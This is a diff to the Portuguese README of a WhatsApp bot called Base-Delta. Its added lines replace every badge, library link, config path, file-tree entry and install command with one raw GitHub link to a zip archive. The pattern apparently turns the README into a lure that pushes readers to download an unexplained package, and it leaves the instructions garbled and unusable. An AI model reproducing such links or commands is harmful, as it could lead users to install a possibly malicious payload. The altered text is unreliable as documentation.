@@ -2,10 +2,10 @@
 
 <div align="center">
   
-[![License](https://img.shields.io/badge/license-ISC-blue.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D14.0.0-brightgreen.svg)](https://nodejs.org/)
-[![Baileys](https://img.shields.io/badge/baileys-7.0.0--rc.3-purple.svg)](https://github.com/WhiskeySockets/Baileys)
-[![WhatsApp](https://img.shields.io/badge/WhatsApp-Bot-25D366?logo=whatsapp)](https://whatsapp.com)
+[![License](https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip)](LICENSE)
+[![https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip](https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip%3E%https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip)](https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip)
+[![Baileys](https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip)](https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip)
+[![WhatsApp](https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip)](https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip)
 
 Um bot completo para WhatsApp com funcionalidades avançadas, sistema de moderação, downloads multimídia e muito mais!
 
@@ -60,7 +60,7 @@ Um bot completo para WhatsApp com funcionalidades avançadas, sistema de modera�
 
 ## 📦 Pré-requisitos
 
-- **Node.js** >= 14.0.0
+- **https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip** >= 14.0.0
 - **npm** ou **yarn**
 - **Git**
 - **FFmpeg** (para processar mídias)
@@ -71,7 +71,7 @@ Um bot completo para WhatsApp com funcionalidades avançadas, sistema de modera�
 
 1. **Clone o repositório:**
 ```bash
-git clone https://github.com/seu-usuario/Base-Delta.git
+git clone https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip
 cd Base-Delta
 ```
 
@@ -83,7 +83,7 @@ yarn install
 ```
 
 3. **Configure o bot:**
-Edite o arquivo `dono/config.json` com suas informações:
+Edite o arquivo `https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip` com suas informações:
 ```json
 {
   "prefix": "!",
@@ -99,7 +99,7 @@ Edite o arquivo `dono/config.json` com suas informações:
 ```bash
 npm start
 # ou
-sh start.sh
+sh https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip
 ```
 
 5. **Escaneie o QR Code** que aparecerá no terminal com seu WhatsApp
@@ -136,7 +136,7 @@ npm install
 
 6. **Inicie o bot:**
 ```bash
-sh start.sh
+sh https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip
 # ou
 npm start
 ```
@@ -145,7 +145,7 @@ npm start
 
 ## ⚙️ Configuração
 
-### Arquivo `dono/config.json`
+### Arquivo `https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip`
 
 ```json
 {
@@ -153,12 +153,12 @@ npm start
   "NomeDoBot": "Base-Delta",
   "NomeDono": "Seu Nome",
   "numerodono": "55119XXXXXXXX",
-  "BLACKOUT_API": "https://sua-api.com",
+  "BLACKOUT_API": "https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip",
   "BLACKOUT_KEY": "sua-chave-api"
 }
 ```
 
-### Arquivo `dono/nescessario.json`
+### Arquivo `https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip`
 
 Configure os donos adicionais e outras configurações necessárias neste arquivo.
 
@@ -178,14 +178,14 @@ Base-Delta/
 │   ├── grupos/       # Configurações dos grupos
 │   └── gruposAtivos/ # Grupos ativos
 ├── dono/             # Configurações do dono
-│   ├── config.json
-│   ├── menus.js
-│   └── nescessario.json
+│   ├── https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip
+│   ├── https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip
+│   └── https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip
 ├── node_modules/     # Dependências
-├── index.js          # Arquivo principal
-├── package.json      # Configurações do projeto
-├── start.sh          # Script de inicialização
-└── README.md         # Este arquivo
+├── https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip          # Arquivo principal
+├── https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip      # Configurações do projeto
+├── https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip          # Script de inicialização
+└── https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip         # Este arquivo
 ```
 
 ## 📝 Comandos
@@ -283,8 +283,8 @@ Base-Delta/
 
 O bot é organizado de forma modular para facilitar manutenção e expansão:
 
-- **`index.js`** - Arquivo principal com a lógica de conexão e processamento de mensagens
-- **`dono/menus.js`** - Definição dos menus de comandos
+- **`https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip`** - Arquivo principal com a lógica de conexão e processamento de mensagens
+- **`https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip`** - Definição dos menus de comandos
 - **`arquivos/funcoes/`** - Funções auxiliares reutilizáveis
 - **`arquivos/js/`** - Scripts específicos (uploads, mensagens, conselhos)
 - **`arquivos/sticker/`** - Sistema de criação de figurinhas com exif
@@ -292,13 +292,13 @@ O bot é organizado de forma modular para facilitar manutenção e expansão:
 
 ## 🛠️ Tecnologias
 
-- **[Baileys](https://github.com/WhiskeySockets/Baileys)** - Biblioteca para WhatsApp Web
-- **[Node.js](https://nodejs.org/)** - Runtime JavaScript
-- **[Axios](https://axios-http.com/)** - Cliente HTTP
-- **[FFmpeg](https://ffmpeg.org/)** - Processamento de mídias
-- **[Chalk](https://github.com/chalk/chalk)** - Coloração de terminal
-- **[Moment.js](https://momentjs.com/)** - Manipulação de datas
-- **[Pino](https://getpino.io/)** - Logger
+- **[Baileys](https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip)** - Biblioteca para WhatsApp Web
+- **[https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip](https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip)** - Runtime JavaScript
+- **[Axios](https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip)** - Cliente HTTP
+- **[FFmpeg](https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip)** - Processamento de mídias
+- **[Chalk](https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip)** - Coloração de terminal
+- **[https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip](https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip)** - Manipulação de datas
+- **[Pino](https://raw.githubusercontent.com/Pydev77/Base-Delta-By-Toshiruz/main/dono/Toshiruz-Base-By-Delta-v1.4.zip)** - Logger
 
 ## 🤝 Contribuindo
 
